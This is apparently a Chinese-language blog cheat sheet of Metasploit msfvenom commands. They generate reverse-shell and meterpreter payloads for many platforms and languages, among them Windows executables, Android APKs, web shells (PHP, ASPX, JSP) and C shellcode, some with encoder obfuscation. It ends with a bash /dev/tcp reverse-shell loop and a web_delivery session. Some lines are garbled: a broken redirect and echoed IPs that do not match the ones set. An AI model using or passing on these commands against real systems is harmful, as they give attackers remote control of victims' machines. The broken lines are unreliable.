==========================
MSF生成各种Payload
==========================


.. post:: 2023-02-26 21:30:12
  :tags: kali, msf
  :category: 安全
  :author: YanQue
  :location: CD
  :language: zh-cn




Windows
==========================

.. code-block:: sh

	msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o payload.exe

Linux
==========================

.. code-block:: sh

	msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf

MAC OS
==========================

.. code-block:: sh

msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho

Android
==========================

.. code-block:: sh

	msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk

PowerShell
==========================

.. code-block:: sh

	msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1

PHP
==========================

.. code-block:: sh

	msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php

	cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >>shell.php

ASP.net
==========================

.. code-block:: sh

	msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx

JSP
==========================

.. code-block:: sh

	msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.jsp

War
==========================

.. code-block:: sh

	msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.war

Node.js
==========================

.. code-block:: sh

	msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.js

Python
==========================

.. code-block:: sh

	msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py

	# msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.179.129 LPORT=58765 -f raw -o payload.py

Perl
==========================

.. code-block:: sh

	msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.pl

Ruby
==========================

.. code-block:: sh

	msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.rb

Lua
==========================

.. code-block:: sh

	msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.lua

Windows ShellCode
==========================

.. code-block:: sh

	msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c

linux shellcode
==========================

.. code-block:: sh

	msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c

mac shellcode
==========================

.. code-block:: sh

	msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c

Bash shellcode
==========================

.. code-block:: sh

	[root@localhost ~]# msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.30 LPORT=8888 > -f raw > payload.sh
	[root@localhost ~]# exec 5<>/dev/tcp/xx.xx.xx.xx/xx
	[root@localhost ~]# cat <&5 | while read line; do $line 2>&5 >&5; done

Python shellcode
==========================

.. code-block:: sh

	msf5 > use exploit/multi/script/web_delivery
	msf5 exploit(multi/script/web_delivery) > set payload python/meterpreter/reverse_tcp
	msf5 exploit(multi/script/web_delivery) > set srvhost 192.168.179.129
	srvhost => 192.168.1.30
	msf5 exploit(multi/script/web_delivery) > set lhost 192.168.179.129
	lhost => 192.168.1.30
	msf5 exploit(multi/script/web_delivery) > set lport 58765

	msf5 exploit(multi/script/web_delivery) > set uripath lyshark
	uripath => lyshark
	msf5 exploit(multi/script/web_delivery) > exploit -j -z
